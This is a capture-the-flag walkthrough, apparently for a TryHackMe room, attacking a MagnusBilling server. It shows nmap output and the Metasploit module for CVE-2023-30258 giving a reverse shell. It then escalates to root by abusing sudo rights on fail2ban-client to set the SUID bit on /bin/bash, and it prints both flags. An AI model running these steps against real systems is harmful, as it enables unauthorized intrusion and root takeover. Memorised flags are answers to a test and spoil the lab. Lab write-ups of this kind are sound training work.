run the scan 

```bash 
# Nmap 7.98 scan initiated Tue Mar  3 22:45:03 2026 as: /usr/lib/nmap/nmap --privileged -sC -sV -T4 --min-rate 5000 -oN billing_nmap 10.48.191.102
Nmap scan report for 10.48.191.102
Host is up (0.10s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 30:0f:58:0c:7a:36:ee:4c:91:94:5b:9f:04:62:68:86 (ECDSA)
|_  256 df:35:02:8c:2f:3f:41:c1:56:29:38:09:d9:ea:d2:cf (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.48.191.102/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  3 22:45:15 2026 -- 1 IP address (1 host up) scanned in 12.14 seconds
```
a long enumeration with `ffuf` have noting, but saw the `/etc` and the `/lib` match with the `CVE-2023-30258
` -> command injection 

ran the 

```bash 
msf -q 
msfconsole
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
set LPORT 9001
exploit
```
and we have the RCE 

find and cat out the `user.txt` first 

```bash 
find / -name "user.txt" -exec cat {} 2>/dev/null \;
```
**USER FLAG**: THM{4a6831d5f124b25eefb1e92e0f0da4ca}

like other priviledge escaltion with linux -> enumeration the suid first

```bash
sudo -l 

Matching Defaults entries for asterisk on ip-10-48-191-102:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-48-191-102:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```
we could see that the user `asterisk` could run without password the feature tool called `fail2ban-client` 

[acording to this method](https://infosecwriteups.com/fail2ban-privilege-escalation-5de164aff6f3) 

or we could faciliate it withint the terminal 

```bash 
# check the current status of jail
sudo /usr/bin/fail2ban-client status

sterisk@ip-10-48-191-102:/tmp$ sudo /usr/bin/fail2ban-client status
Status
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd

```
```bash
# check the jail  -> in this case i use sshd
sudo /usr/bin/fail2ban-client get sshd actions

# set the bash suid 
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban 'chmod +s /bin/bash'

# trigger the command 
sudo /usr/bin/fail2ban-client set sshdd banip 1.2.3.4

# and we spawn the shell
/bin/bash -p
```
and we have the root 

```bash
bash-5.2# whoami
root
bash-5.2# a
bash-5.2# cat /root/root.txt
```
**ROOT FLAG**: THM{33ad5b530e71a172648f424ec23fae60}
